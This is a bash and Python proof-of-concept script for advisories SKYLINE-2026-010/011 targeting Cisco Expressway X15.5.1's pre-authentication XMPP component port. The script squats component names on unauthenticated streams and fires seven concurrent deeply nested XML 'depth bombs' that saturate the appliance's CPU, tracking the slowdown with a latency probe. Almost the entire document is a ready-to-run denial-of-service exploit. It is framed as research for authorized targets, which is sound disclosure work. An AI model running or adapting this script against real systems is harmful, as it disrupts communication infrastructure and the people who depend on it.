#!/usr/bin/env bash
# Null;Tone — PoC for SKYLINE-2026-010/011 (Squathack + Burnhack)
# Pre-auth XMPP component-accept (:7400) name-squat + Θ(n²) depth-bomb saturation
# on Cisco Expressway X15.5.1 (C and E). Research PoC — authorized targets only.
#
# Usage:   ./poc.sh <host> [port]            full 7-stream volley (IMPACTFUL: saturates
#                                            both cores of a 2-vCPU appliance for ~1-4 min)
#          ./poc.sh <host> [port] --solo     single stream, depth 10000 — demonstrates the
#                                            superlinear CPU cost (~1s class) without saturating
#
# Cleanup: none needed — attacker-side sockets only. The target daemon does NOT crash,
#          keeps its pid, and returns to baseline RTT within ~60s of the last stream EOF.
#          Verified in lab: zero established connections post-drain, kernel log clean,
#          zero fail2ban ticks (no jail covers :7400).
set -euo pipefail
HOST="${1:?usage: poc.sh <host> [port] [--solo]}"
PORT="${2:-7400}"
MODE="${3:-volley}"

command -v python3 >/dev/null || { echo "python3 required"; exit 1; }

exec python3 - "$HOST" "$PORT" "$MODE" <<'PYEOF'
import socket, sys, threading, time

HOST, PORT, MODE = sys.argv[1], int(sys.argv[2]), sys.argv[3]
SOLO_DEPTH, VOLLEY_DEPTH, CONNS = 10000, 25000, 7
IDS = [b'nt-poc-a', b'nt-poc-b', b'nt-poc-c', b'nt-poc-d',
       b'nt-poc-e', b'nt-poc-f', b'nt-poc-g']   # distinct names — Squathack needs no registry knowledge
HDR = ('<?xml version="1.0"?><stream:stream xmlns="jabber:component:accept" '
       'xmlns:stream="http://etherx.jabber.org/streams" to="%s">').encode()

def log(m): print('[%s] %s' % (time.strftime('%H:%M:%S'), m), flush=True)

def probe(pid, timeout=45):
    """Bad-handshake RTT oracle: latency = service health; conflict content = name claimed."""
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), 15)
        s.sendall(HDR % pid + b'<handshake>' + b'0'*40 + b'</handshake>')
        s.settimeout(timeout); buf = b''
        while not any(k in buf for k in (b'error', b'authorized', b'conflict')):
            d = s.recv(65536)
            if not d: break
            buf += d
        s.close()
        tag = 'conflict(name-claimed)' if b'conflict' in buf else 'error/other'
        return time.time() - t0, tag
    except Exception as e:
        return time.time() - t0, 'EXC %r' % (e,)

def bomb(name, depth, out):
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), 30)
        s.sendall(HDR % name); time.sleep(0.2)
        try: s.recv(4096)                       # stream header back = accepted pre-auth
        except Exception: pass
        s.sendall(b'<a>' * depth + b'</a>' * depth + b'</stream:stream>')
        s.shutdown(socket.SHUT_WR); s.settimeout(900)
        while s.recv(65536): pass               # hold through the server-side parse drain
        out.append('%s wall=%.1fs' % (name.decode(), time.time() - t0)); s.close()
    except Exception as e:
        out.append('%s EXC %.1fs %r' % (name.decode(), time.time() - t0, e))

log('target %s:%d mode=%s' % (HOST, PORT, MODE))
dt, tag = probe(IDS[0]); log('baseline probe: %.2fs (%s)' % (dt, tag))
if dt > 1.0:
    log('WARNING: baseline already degraded — target busy; results will be noisy')

if MODE == '--solo':
    log('solo stream depth=%d (superlinear-cost demo, non-saturating)' % SOLO_DEPTH)
    out = []; t = threading.Thread(target=bomb, args=(IDS[0], SOLO_DEPTH, out)); t.start()
    for i in range(3):
        time.sleep(2); dt, tag = probe(IDS[1]); log('probe during solo parse: %.2fs (%s)' % (dt, tag))
    t.join(); log(out[0] if out else 'solo stream failed')
    dt, tag = probe(IDS[0]); log('post probe: %.2fs (%s)' % (dt, tag))
    sys.exit(0)

# --- full volley: 7 concurrent distinct-name depth bombs ---
log('preflight: header-only opens (no burn)')
ok = 0
for i in IDS[:CONNS]:
    try:
        s = socket.create_connection((HOST, PORT), 8); s.sendall(HDR % i)
        s.settimeout(4); hdr = s.recv(4096); s.close()
        if b'stream:stream' in hdr and b'conflict' not in hdr: ok += 1
        else: log('  %s NOT accepted: %r' % (i.decode(), hdr[:80]))
    except Exception as e:
        log('  %s preflight EXC %r' % (i.decode(), e))
    time.sleep(1)
log('preflight: %d/%d names accepted pre-auth (Squathack surface)' % (ok, CONNS))
if ok < 2: log('ABORT: too few accepted streams'); sys.exit(1)

out = []; t0 = time.time()
ths = [threading.Thread(target=bomb, args=(n, VOLLEY_DEPTH, out), daemon=True) for n in IDS[:CONNS]]
for t in ths: t.start()
log('volley fired: %d x depth-%d streams (~%.0f KB each)' % (CONNS, VOLLEY_DEPTH, VOLLEY_DEPTH*6/1024))

sched, i, rec, t30 = [1, 3, 5, 7, 9], 0, 0, 30.0
while time.time() - t0 < 900:
    el = time.time() - t0
    if i < len(sched) and el >= sched[i]:
        dt, tag = probe(IDS[0]); log('probe@+%.0fs: %.2fs (%s)' % (el, dt, tag)); i += 1; time.sleep(1); continue
    if i >= len(sched) and el >= t30:
        alive = any(t.is_alive() for t in ths)
        dt, tag = probe(IDS[0]); log('probe@+%.0fs: %.2fs (%s) bombs_alive=%d' % (el, dt, tag, sum(t.is_alive() for t in ths)))
        if not alive:
            rec = rec + 1 if dt <= 0.15 else 0
            if rec >= 2: log('RECOVERY: 2 consecutive baseline probes at +%.0fs' % el); break
        t30 += 30.0
    time.sleep(1)
for t in ths: t.join(30)
for line in sorted(out): log(line)
time.sleep(5); dt, tag = probe(IDS[0]); log('final probe: %.2fs (%s) — target back to baseline, zero state left' % (dt, tag))
PYEOF
